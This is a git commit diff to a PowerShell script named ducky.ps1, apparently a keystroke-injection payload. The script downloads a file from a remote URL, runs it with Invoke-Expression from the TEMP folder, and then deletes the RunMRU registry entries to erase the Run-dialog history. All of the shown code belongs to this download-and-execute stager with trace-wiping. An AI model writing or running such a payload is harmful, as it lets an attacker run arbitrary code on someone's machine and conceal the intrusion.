c990c623247b5c0905c6cb95566247edf4382b39
Byshop <60990002+byshop04@users.noreply.github.com>
2023-07-16 15:59:51 -0300

    Update ducky.ps1

--- ducky.ps1
+++ ducky.ps1
@@ -5,7 +5,7 @@ $webClient = New-Object System.Net.WebClient
 $webClient.Encoding = [System.Text.Encoding]::UTF8
 $webClient.DownloadFile($sourceUrl, $destinationFile)
 
-$scriptContent = Get-Content -Path "$cd\script.ps1" -Encoding UTF8
+$scriptContent = Get-Content -Path "$env:TEMP\script.ps1" -Encoding UTF8
 $scriptContent = $scriptContent -join "`r`n"
 Invoke-Expression $scriptContent
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
